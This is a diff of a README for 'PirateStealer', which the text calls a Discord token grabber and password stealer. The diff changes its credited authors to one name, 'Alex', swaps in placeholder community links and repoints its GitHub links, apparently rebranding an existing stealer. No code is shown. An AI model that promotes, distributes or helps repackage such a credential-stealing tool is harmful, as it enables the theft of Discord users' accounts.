@@ -1,14 +1,12 @@
-##### [🌍 Discord Server](https://discord.gg/NzryCyfC3t) -  [:gem: Premium](https://discord.gg/NzryCyfC3t) - [🔧 Builder](https://github.com/Stanley-GF/Arizona) - [💡 Features](https://github.com/Stanley-GF/Arizona#features) 
+##### [🌍 Discord Server](Proximamente) -  [:gem: Premium](Proximamente) - [🔧 Builder](https://github.com/Stanley-GF/Arizona) - [💡 Features](https://github.com/AlexClient/PirateStealer#features) 
 
 ### Authors
-- Stanley
-- Bytixo
+- Alex
 
 ### Contributors
-- Autist69420
-- HideakiAtsuyo
+- Alex
 
-# PirateStealer (by Brooklyn inc)
+# PirateStealer (by AlexClient inc)
 The new modern discord token grabber & token stealer, with discord password & token even when it changes
 
 # Terms
